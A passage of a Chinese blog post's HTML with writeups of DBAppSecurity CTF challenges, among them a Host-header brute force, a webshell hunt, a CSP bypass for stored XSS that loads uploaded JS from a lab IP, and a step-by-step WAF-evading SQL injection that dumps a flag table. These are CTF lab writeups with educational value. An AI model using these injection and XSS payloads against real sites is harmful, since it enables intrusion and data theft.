class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里改动了<code>$b = &#39;http://&#39; . $f . substr($e, 3, 10) . $g;</code><br>但是不太影响，只要提前一点定下一个时间，然后服务器上名字加上这个时间点的<code>substr($e, 3, 10).11c</code>，然后循环爆破就行了。</p>
+<h2 id="Proxy-Error"><a href="#Proxy-Error" class="headerlink" title="Proxy Error"></a>Proxy Error</h2><p>不知道这个题出的意义何在……<br>我们访问页面得到信息:<br>Proxy Error:192.168.5.46</p>
+<p>一开始没有思路，后来抓包修改HOST<br>发现回显都是相同的<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Proxy Error:192.168.5.1</div><div class="line">Proxy Error:192.168.5.2</div></pre></td></tr></table></figure></p>
+<p>然后随便蛇皮爆破了一下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">Host</span> : 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.132</span></div></pre></td></tr></table></figure></p>
+<p>可以发现flag</p>
+<h1 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h1><h2 id="“后门查杀”解题思路"><a href="#“后门查杀”解题思路" class="headerlink" title="“后门查杀”解题思路"></a>“后门查杀”解题思路</h2><p>步骤一：下载压缩包，解压<br>步骤二：通过时间排序，关键字查找等方法，在include下发现 include.php 为 webshell 文件。<br>步骤三：查找到 webshell 密码即可 flag。</p>
+<h2 id="“Jshunt”解题思路"><a href="#“Jshunt”解题思路" class="headerlink" title="“Jshunt”解题思路"></a>“Jshunt”解题思路</h2><p>题目描述       </p>
+<p>由于忘记了账号密码，黑客想通过一个非法的途径找回自己的账号密码。突然发现有个留言板，黑客</p>
+<p>拍了拍脑袋想到，我有办法了！最后黑客通过留言板成功登陆后台修改了自己忘记的密码。 (答案为flag{}形式，提交{}内内容即可)   </p>
+<p>解题步骤</p>
+<p>步骤一 ：打开网页页面，查看到一个留言板，输入内容 观察发现如下提示<br>步骤二 ：Fuzz标签不断的尝试各种类型的标签，最后发现只能使用 script<br>步骤三：对script标签的属性进行fuzz，发现只能src属性,尝试包含 js文件，发现如下图.<br>步骤四：包含外部js地址也会报错，同时观察返回包，发现如下情 况，使用了csp策略头(Content-Security-Policy)，禁止包含外部js文件。<br>步骤五：观察页面发现有个上传的地方<br>步骤六：上传带有js代码的图片文件，然后使用src加载文件。留言 给管理员,返回信息提示代码是成功的<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://172.16.80.253/js.jpg</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">``</div><div class="line"></div><div class="line">CSP策略</div></pre></td></tr></table></figure></p>
+<p>Content-Security-Policy: script-src ‘self’:img-src *;<br>```</p>
+<h2 id="“绕过看门狗”解题思路"><a href="#“绕过看门狗”解题思路" class="headerlink" title="“绕过看门狗”解题思路"></a>“绕过看门狗”解题思路</h2><p>题目描述       老王经常喜欢去邻居家聊天，奈何邻居家经常放一只哈士奇看门。哈士奇比萨摩耶聪明，能分辨正常的人型生物不让靠近。老王发现只要自己套个头套之类，哈士奇就认不出来了。聪明的小伙伴快想出老王绕过看门狗的方法，去看看老王到底在里面聊些啥。（答案以flag{}形式过得，将flag{}中内容提交即可）</p>
+<p>解题步骤</p>
+<p>步骤一：打开链接，看到一个新闻列表。</p>
+<p>步骤二：点开某条标题，看到新闻详情。 </p>
+<p>步骤三：用<code>and 1= 1</code>测试，发现会对注入做拦截。 </p>
+<p>步骤四：通过<code>And 1=1</code>测试，发现可以绕过注入拦截。</p>
+<p>步骤五：通过<code>Union Select 1,2,3,4,5#</code> 测试，发现有5个字段。 </p>
+<p>步骤六：通过<code>Union Select 1,database(),user(),version(),5#</code>获取数据库的敏感数据，当前数据库为news。</p>
+<p>步骤七：通过<code>Union  Select 1，(selEct table_name fRoM infOrmation_schema.tables whEre TABLE_SCHEMA = ‘news’ limit 1,1),3,4,5#</code><br>获得有一张tb_flag表。</p>
+<p>步骤八：通过<code>Union Select 1,(selecT column_name frOm  infoRmation_schema.columns where table_name=‘tb_flag’ anD table_schema=‘news’ limit 0,1),3,4,5#</code> 获得tb_flag只有一个flag字段。</p>
+<p>步骤九：通过<code>ldid=2 Union Select 1,(selecT * frOm tb_flag/**/limit 0,1), 3,4,5#</code><br>获得flag{1396265adbb760c86475304b98e3f61c}</p>
+<h2 id="“一张谍报”解题思路"><a href="#“一张谍报”解题思路" class="headerlink" title="“一张谍报”解题思路"></a>“一张谍报”解题思路</h2><p>题目描述：</p>
+<p>国家能源总部经过派出卧底长期刺探，终于找到一个 潜伏已久的国外内鬼：三楼能源楼管老王。由于抓捕仓促， 老王服毒自尽了。侦查部门搜出老王每日看的报纸原来是特 制的情报。聪明的你能从附件的报纸中找出情报么？flag是 老王说的暗号。（由于老王的线人曾今做的土匪，所以用的 行话）</p>
+<p>步骤一：打开word，从中发现有两篇题目一样，但内容不一样的文章。<br>步骤二：将两篇文字错乱的文章一一对应，可以将下方的淡色字体 的文章解密，获得两个暗号<br>步骤三：老王是三楼楼管，可以从行话中猜测，三枝遇孙子指的就是老王。暗号是：“南天菩萨放鹰捉猴头”。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>官方论坛 含部分历史writeup<br><a href="http://forum.91ctf.com/index.php/article" target="_blank" rel="external">http://forum.91ctf.com/index.php/article</a></p>
+<p><a href="http://skysec.top/2017/12/17/%E5%AE%89%E6%81%92%E6%9D%AF-12%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="external">http://skysec.top/2017/12/17/%E5%AE%89%E6%81%92%E6%9D%AF-12%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/ctf/"> #ctf </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/17/TEMPEST-Attack/">TEMPEST Attack 电磁波盗听技术</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/12/17/dbappsec-ctf/"
+               data-title="安恒ctf 部分writeup" data-url="http://blkstone.github.io/2017/12/17/dbappsec-ctf/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">501</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">148</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#12月"><span class="nav-number">1.</span> <span class="nav-text">12月</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto-1"><span class="nav-number">1.1.</span> <span class="nav-text">crypto 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto-2"><span class="nav-number">1.2.</span> <span class="nav-text">crypto 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“粽子的来历-”解题思路"><span class="nav-number">1.3.</span> <span class="nav-text">“粽子的来历 ”解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#与时俱进"><span class="nav-number">1.4.</span> <span class="nav-text">与时俱进</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爱窒息、痛"><span class="nav-number">1.5.</span> <span class="nav-text">爱窒息、痛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Proxy-Error"><span class="nav-number">1.6.</span> <span class="nav-text">Proxy Error</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10月"><span class="nav-number">2.</span> <span class="nav-text">10月</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#“后门查杀”解题思路"><span class="nav-number">2.1.</span> <span class="nav-text">“后门查杀”解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“Jshunt”解题思路"><span class="nav-number">2.2.</span> <span class="nav-text">“Jshunt”解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“绕过看门狗”解题思路"><span class="nav-number">2.3.</span> <span class="nav-text">“绕过看门狗”解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“一张谍报”解题思路"><span class="nav-number">2.4.</span> <span class="nav-text">“一张谍报”解题思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
